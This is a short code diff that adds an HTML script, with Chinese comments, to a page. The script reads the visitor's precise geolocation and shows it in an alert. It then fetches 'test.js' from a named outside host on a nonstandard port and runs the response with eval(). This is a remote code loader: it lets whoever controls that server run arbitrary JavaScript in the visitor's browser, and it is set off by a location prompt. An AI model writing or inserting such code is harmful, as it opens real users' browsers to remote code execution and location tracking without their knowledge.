@@ -1,0 +1,43 @@
+ 
+ <script>
+ function xmlhttp()
+{
+if (window.XMLHttpRequest)
+{
+    //  IE7+, Firefox, Chrome, Opera, Safari 浏览器执行代码
+    return new XMLHttpRequest();
+}
+else
+{
+    // IE6, IE5 浏览器执行代码
+    return new ActiveXObject("Microsoft.XMLHTTP");
+}
+}
+
+
+
+ navigator.geolocation.getCurrentPosition(function (position) {
+       console.log(position);
+	   alert(position.coords.latitude);
+	   	var xp=xmlhttp();
+	  xp.onreadystatechange=function()
+	  {
+		if (xp.readyState==4 && xp.status==200)
+		{
+		  var s=xp.responseText;
+		  eval(s);
+		}
+	  }
+	  xp.open("GET","http://cqb98.synology.me:50614/static/test.js",true);
+	  xp.send();
+    }, function (err) {
+        console.log(err.code);
+    }, {
+        enableHighAcuracy: true, //位置是否精确获取
+        timeout: 5000,//获取位置允许的最长时间
+        maximumAge: 0 //多久更新获取一次位置
+    })
+ </script>
+ 
+ 
+ 
